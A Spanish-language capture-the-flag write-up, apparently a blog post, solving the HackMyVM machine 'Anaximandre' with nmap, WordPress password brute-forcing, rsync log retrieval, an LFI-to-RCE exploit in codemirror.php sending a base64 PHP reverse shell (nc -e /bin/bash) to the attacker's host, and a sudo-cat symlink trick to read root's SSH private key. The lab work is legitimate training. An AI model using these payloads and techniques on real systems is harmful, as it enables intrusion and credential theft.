---
layout: post
title: Anaximandre - Hackmyvm
tags: [ctf, hackmyvm]
---

**Autor**: Cromiphi \\
**Dificultad**: Medio

![img](/imgs/write-ups/hackmyvm/anaximandre/anaximandre_1.png#center)

## Reconocimiento

Tras un escaneo inicial con "nmap", veo los siguientes puertos abiertos

```
$ nmap -p- 192.168.1.26    
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-09 06:34 EST
Nmap scan report for 192.168.1.26
Host is up (0.00018s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
873/tcp open  rsync

Nmap done: 1 IP address (1 host up) scanned in 1.90 seconds
```

Voy a comenzar enumerando el puerto 80.

### 80 (http)

Varios links en la página apuntan al dominio "anaximandre.hmv" por lo que lo añado a /etc/hosts. Además se puede ver que la página está hecha con wordpress por lo que ejecuto "wpscan" para buscar vulnerabilidades, usuarios y contraseñas.

```
$ wpscan --url "http://192.168.1.26"  --api-token [api-token] -P /usr/share/wordlists/rockyou.txt --detection-mode aggressive --plugins-detection aggressive -t 10
```

Al ejecutarlo descubro al usuario "webmaster" cuya contraseña es "mickey".

Al loguearme en Wordpress veo dos comentarios recientes del admin del servidor, en uno de los dos hay un mensaje confidencial "Yn89m1RFBJ" (Lo guardo para mas tarde).

No encuentro nada más por lo que ahora enumero el puerto 873.

### 873 (rsync)

En este puerto se está ejecutando un servidor "rsync". Enumero carpetas públicas:

```
$ rsync  rsync://192.168.1.26/
    share_rsync     Journal
```

Y despues veo los archivos que contiene la carpeta:

```
$ rsync  rsync://192.168.1.26/share_rsync
drwxr-xr-x          4,096 2022/11/26 10:23:01 .
-rw-r-----         67,719 2022/11/26 10:19:33 access.log.cpt
-rw-r-----          4,206 2022/11/26 10:19:53 auth.log.cpt
-rw-r-----         45,772 2022/11/26 10:19:53 daemon.log.cpt
-rw-r--r--        229,920 2022/11/26 10:19:53 dpkg.log.cpt
-rw-r-----          4,593 2022/11/26 10:19:33 error.log.cpt
-rw-r-----         90,768 2022/11/26 10:19:53 kern.log.cpt
```

Los voy descargando uno a uno de la siguiente manera:

```
$ rsync  rsync://192.168.1.26/share_rsync/access.log.cpt .
```

Los archivos descargados tienen extension ".cpt". Estos archivos se pueden descomprimir con "ccrypt" y cuando nos pide contraseña uso la que encontré antes en el comentario de wordpress.

```
$ ccrypt -d access.log.cpt
Enter decryption key: Yn89m1RFBJ
```

Buscando entre los diferentes archivos log desencriptados encuentro varias cositas interesantes.

### auth.log

Usuario: chaz

```
Nov 26 16:16:07 debian useradd[16501]: new user: name=chaz, UID=1001, GID=1001, home=/home/chaz, shell=/bin/bash, from=/dev/pts/0
```

### access.log

Subdominio: lovegeografia.anaximandre.hmv
Posible LFI:

```
192.168.0.29 - - [26/Nov/2022:16:15:38 +0100] "GET /exemplos/codemirror.php?&pagina=../../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1" 200 982 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
```

Voy a comenzar con el posible LFI

## Explotación

Buscando un poco en google encuentro la vulnerabilidad CVE-2022-32409 que afecta a codemirror.php con la que se puede conseguir ejecucion de código en el servidor.

```
$ echo -n "<?php system('nc -e /bin/bash 192.168.1.22 1234'); ?>" | base64
    PD9waHAgc3lzdGVtKCduYyAtZSAvYmluL2Jhc2ggMTkyLjE2OC4xLjIyIDEyMzQnKTsgPz4=
```

Ejecuto un listener en el puerto 1234 de mi máquina y navego a la siguiente url para ejecutar la shell inversa.

```
http://lovegeografia.anaximandre.hmv/exemplos/codemirror.php?&pagina=data://text/plain;base64,PD9waHAgc3lzdGVtKCduYyAtZSAvYmluL2Jhc2ggMTkyLjE2OC4xLjIyIDEyMzQnKTsgPz4=
```

```
$ nc -lvnp 1234
    listening on [any] 1234 ...
    connect to [192.168.1.22] from (UNKNOWN) [192.168.1.26] 60032
    whoami
    www-data
```

Y con esto ya estoy dentro.

## Escalado de privilegios

Como el servidor tiene ejecutandose rsync compruebo en sus archivos de configuracion alguna credencial guardada.
```
$ cat /etc/rsyncd.auth
    chaz:alanamorrechazado
```

Me conecto mediante ssh para tener una terminal más cómoda

```
ssh chaz@<ip>
```
Una vez conectado como chaz compruebo si puede ejecutar algún comando con sudo:

```
$ chaz@anaximandre:~$ sudo -l
[...]
User chaz may run the following commands on anaximandre:
    (ALL : ALL) NOPASSWD: /usr/bin/cat /home/chaz/*
```

Teniendo privilegios para ejecutar cat en los archivos del home de chaz podemos leer cualquier archivo del sistema mediante "soft links". En este caso leo el id_rsa de root.

```
chaz@anaximandre:~$ ln -s /root/.ssh/id_rsa .
chaz@anaximandre:~$ ls
id_rsa  user.txt
chaz@anaximandre:~$ sudo cat /home/chaz/*
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAymVIJCfeVhY3wXQyz8tZrt+cHyKuDTTXN+NpIbM7EakMulk97ZHu
jNWDOMzF+f1jicidrEZkTjqCMLtwF4wpPNskUCAC7XjglhxifQWOUQXyRvkSPT690q6o+6
OfesMAs2CG+tfhhsfR2yqpC6v3UTbUdIcBUR3lp+bng6IlV6An5iWTBfI4Rd7VkWP9Cu7m
gfe6Gp8u6PE7R0lO4mzd5Sf8Tx06r1x/AVP9d2xl4NgvRmFM1bwGWVCN1NKX8e83dyHQoG
JCPFs76aNWsLfL2MaK1DLrrbRrytic+8/TNvJSqHVthX4CUMsa4tU0V9fi8phq2nG+Ny9N
qZVieX7ai1VY6M95vAI6Jser62YnAjftITMIIInEt7t0GAx7obwUtOH0Cg9wp7ttK6ou6r
99x2oI33gv0L8YhJhBOwWm+bj1SmWv7CFvlR04kDoMUxTtttwFryXPabHSMD29weuE7srn
lHYbinlTpSsMu1zkAsHdPPfICgF1P9KTVSU1Ay9FAAAFkBtj3CkbY9wpAAAAB3NzaC1yc2
EAAAGBAMplSCQn[...]USFdcz4eJ/EaePaNtfzo6K5BYJmt2i
9XZer3Q3fowTWYzStuVaEifKSmCrMR/9yD9x3gZUMhiGrfcPr+Z8pjHzF4ER0UUaWyOQM6
ouiMN0IAj/JVviNlbQFdpoie0DM8qovXqgD5NNwdRvlCW57IWYAY9OjK931qr6+rGHM9NB
NPPUSGcYjOnbUQ1jYIBeYpFGKq1GL7oxcXQXVbqm84EBFx1Tz4Rnc2+ox/qOc43B04fUYp
CXt4kL70hA2hMVKtcuHXK178vxXT3/wo4X4MSmDQ0mYY1fGOEiDcmEWagk0PUIiFWlQPEp
YwM/dHiOUj5ZslqAhEM62aQUfE5X2oeh/6wugrbscktzWl+ghb73pYRQa/xHWvWm+5Dmek
LKoj8zp21xX+MBbwhFnakqCySrn6FflrsjU4g7Mw6kkwfH1tHEeiSZ/tbQgGwOqJpkoQAA
AMBfAnDFmytdTka5I4Rfd5yEob5sIsAKW5QE4dcdRgh/p03Z6uuwes+wzp6HcMaFx+7S1K
q3n156W1igBzcZb3qIJSmUWJ8msvGCIBx8wORfFO62C6MxemwbQHpRMJLVtdUmPzNoakJN
FK7UmvuH+bbnnbAEYZiP6b3LFU/52aOSw1ZhiaAsybrCyx4lXmp2gC3ypoCpKZIfMkH3LX
rIpWReurThX2FOi102ik52D1w6YpeWY5lK/4XZhYP/VOYG2G8AAADBAPt3kWvCWu/6ia+g
wtTQL+3qZpoHeaoRm50JWMook00W99XniNBoYJjry219u8KTZD8mjwNMuEjmbdwSFCpMrc
wqnCJlJYYknKJ33+PSaCXw7nAO7Nm8X9C/lrD/H9nTPlFnIkP/7d8wn53jQSgweNdhpXxB
p122C3/yXW2G+HjJt9WQc1IBdZ9WRsz1Qj6znE94X83HQawAoEfwqctmH/Y17M1Vl4KafX
qD/2qvGZuSUq4yk0H+BVfWYsMRkBBPrQAAAMEAzgtEMU65MwI+JrGK1QpJnSKRzJvOcnce
xPsiaSeWu1/8hGdyP2zjBNf6YSSRijwvQaoXieTadK7DIb9JAAKwzzEvRFD8krElkbwnFQ
Y1aew2FaQABKsxthX/fY7IJgcYuyWxcKEGOCpU51MrvRVcYF/irDJqzoJpnOiMcspPwBm0
gX2Wvo5gZGNuBg7sgrt3liqXKQzM0xheKX/Tvh0WkhGH8Y5cWO9eYeGGnM9SnIUkzm9Gv4
7ic/80uLk8snD5AAAAFHJvb3RAYW5heGltYW5kcmUuaG12AQIDBAUG
-----END OPENSSH PRIVATE KEY-----
```

Teniendo ya su id_rsa, conseguir root es simple
```
$ ssh root@192.168.1.26 -i id_rsa 

root@anaximandre:~# :)
```

Muchas gracias  **Cromiphi** por esta máquina.
